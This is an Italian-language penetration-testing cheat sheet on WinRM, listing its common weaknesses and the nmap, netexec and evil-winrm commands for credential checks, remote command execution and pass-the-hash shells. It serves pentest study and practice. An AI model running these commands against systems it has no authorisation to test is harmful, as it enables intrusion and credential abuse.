# WinRM — Windows Remote Management
**Porte:** 5985 (HTTP), 5986 (HTTPS)  
**Categoria:** Accesso Remoto

Protocollo Microsoft per esecuzione comandi remoti via riga di comando (PowerShell).
Basato su WS-Management. A differenza di RDP, non mostra il desktop — solo terminale.
Porta 5985 (HTTP, in chiaro!) e 5986 (HTTPS, cifrato).

## Vulnerabilità comuni

- Credenziali deboli — shell PowerShell completa con accesso admin
- Pass-the-Hash — autenticazione con hash NTLM rubato (non serve la password in chiaro)
- HTTP (5985) in chiaro — credenziali intercettabili sulla rete
- Accesso diretto a PowerShell — esecuzione codice arbitrario, download malware

## Enumerazione & Comandi

### SCAN

```bash
nmap -sV -sC -p5985,5986 --disable-arp-ping -n <IP>  # Scan porte WinRM
```

### VERIFICA CREDENZIALI

```bash
nxc winrm <IP> -u 'user' -p 'password'               # Test login (Pwn3d! = admin locale!)
nxc winrm <IP> -u 'user' -p 'password' -x 'hostname' # Esegui comando remoto
```

### SHELL INTERATTIVA

```bash
evil-winrm -i <IP> -u 'user' -p 'password'           # Shell PowerShell completa
evil-winrm -i <IP> -u 'user' -H 'HASH_NTLM'         # Pass-the-Hash (senza password!)
```

### COMANDI UTILI DENTRO LA SHELL

```bash
  Get-LocalUser                                       # Lista utenti locali Windows
  Get-LocalGroup                                      # Lista gruppi
  Get-Process                                         # Processi attivi
```

## Tool consigliati

*Installa con `use <tool>` + `install`*

- **nmap**
- **evil-winrm**
- **netexec**
- **hydra**
